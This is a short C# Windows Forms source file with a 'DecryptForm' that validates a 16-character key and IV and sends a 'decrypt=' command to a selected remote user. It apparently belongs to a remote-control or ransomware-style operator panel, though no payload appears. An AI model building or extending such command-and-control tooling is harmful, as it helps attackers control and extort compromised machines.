using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace Dragon_
{
    public partial class DecryptForm : Form
    {
        public DecryptForm()
        {
            InitializeComponent();
        }

        private void button1_Click(object sender, EventArgs e)
        {
            if (textBox3.Text == "")
            {
                MessageBox.Show("The Decryption Key Cannot Be Empty", "Warning");
                return;
            }

            if (textBox1.Text == "")
            {
                MessageBox.Show("The Decryption IV Cannot Be Empty", "Warning");
                return;
            }

            if (textBox3.Text.Length < 16)
            {
                MessageBox.Show("The Decryption Key Needs A Length Of 16 Characters", "Warning");
                return;
            }

            if (textBox1.Text.Length < 16)
            {
                MessageBox.Show("The Decryption IV Needs A Length Of 16 Characters", "Warning");
                return;
            }

            Program.hh.SendCommand($"decrypt={textBox3.Text}|{textBox1.Text}", Program.AppState.CurrentUser);

        }
    }
}
